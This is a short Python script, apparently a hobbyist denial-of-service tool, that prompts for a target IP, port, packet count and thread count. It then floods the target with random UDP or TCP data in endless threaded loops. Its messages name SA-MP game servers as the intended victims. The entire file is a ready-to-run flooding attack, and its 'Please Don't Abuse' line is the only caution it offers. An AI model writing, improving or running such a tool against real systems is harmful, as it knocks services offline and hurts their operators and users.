#!/usr/bin/env python3
#Code by ZieLx
import random
import socket
import threading
import os

os.system("clear")
print("\033[91m     =========================================================   \n")
print("      [!] Author Tools : ZieLxxx                                          ")
print("      [Note] : Please Don't Abuse Okay                                  \n")
print("     =========================================================   ")

print("     ▒███████▒ ██▓▓█████  ██▓    ▒██   ██▒▒██   ██▒▒██   ██▒     ")
print("     ▒ ▒ ▒ ▄▀░▓██▒▓█   ▀ ▓██▒    ▒▒ █ █ ▒░▒▒ █ █ ▒░▒▒ █ █ ▒░     ")
print("     ░ ▒ ▄▀▒░ ▒██▒▒███   ▒██░    ░░  █   ░░░  █   ░░░  █   ░     ")
print("       ▄▀▒   ░░██░▒▓█  ▄ ▒██░     ░ █ █ ▒  ░ █ █ ▒  ░ █ █ ▒      ")
print("     ▒███████▒░██░░▒████▒░██████▒▒██▒ ▒██▒▒██▒ ▒██▒▒██▒ ▒██▒     ")
print("     ░▒▒ ▓░▒░▒░▓  ░░ ▒░ ░░ ▒░▓  ░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░     ")
print("     ░░▒ ▒ ░ ▒ ▒ ░ ░ ░  ░░ ░ ▒  ░░░   ░▒ ░░░   ░▒ ░░░   ░▒       ")
print("     ░ ░ ░ ░ ░ ▒ ░   ░     ░ ░    ░    ░   ░    ░   ░    ░       ")
print("         ░ ░     ░     ░  ░    ░  ░ ░    ░   ░    ░   ░    ░        ")
print("\033[91m     ░                                                         ")

ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" ATTACK ? (y/n) : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" REZA ATTACKING SA-MP SERVER")
		except:
			print("[!] MT KAH MANISSS")

def run2():
	data = random._urandom(16)
	i = random.choice(("[T***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" REZA ATTACKING SA-MP SERVER")
		except:
			s.close()
			print("[*] MT KAH DEK?")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
